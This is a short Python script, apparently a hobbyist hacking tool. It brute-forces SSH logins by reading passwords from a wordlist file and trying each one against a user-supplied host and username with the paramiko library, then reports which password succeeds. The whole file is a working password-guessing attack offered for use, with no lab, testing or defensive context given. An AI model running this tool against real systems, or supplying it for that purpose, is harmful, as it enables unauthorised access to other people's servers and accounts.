import paramiko, os, socket, termcolor, sys



host = input(termcolor.colored(("Enter target website:"), color = "cyan"))
user = input("Enter username:")
password = input("Enter the passwords file:")



def ssh_connect(p, code = 0):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

  try:
    ssh.connect(host, port = 22, username = user, password = p)
  except paramiko.AuthenticationException:
    code = 1
  except socket.error as e:
    code = 2
  except paramiko.BadHostKeyException:
    code = 3
  except paramiko.SSHException:
    code = 4
  ssh.close()
  return code

if not os.path.exists(password):
  print(termcolor.colored(("File not found or incorrect path!"), color='light_blue'))
  sys.exit(1)


with open(password, "r") as file:
  for line in file.readlines():
    password = line.strip()

    try:
      response = ssh_connect(password)

      if response == 0:
        print(termcolor.colored(("Found password: " + password + ", for account: "\
      + user), color = "light_green"))
        break
      elif response == 1:
        print(termcolor.colored(("Incorrect login: " + password), color = "red"))
      elif response == 2:
        print(termcolor.colored(("Can\'t connect"), color = "yellow"))
      elif response == 3:
        print(termcolor.colored(("Bad host key"), color = "yellow"))
      elif response == 4:
        print(termcolor.colored(("SSH Exception"), color = "yellow"))
        sys.exit(1)


    except Exception as e:
      print(e)
      pass


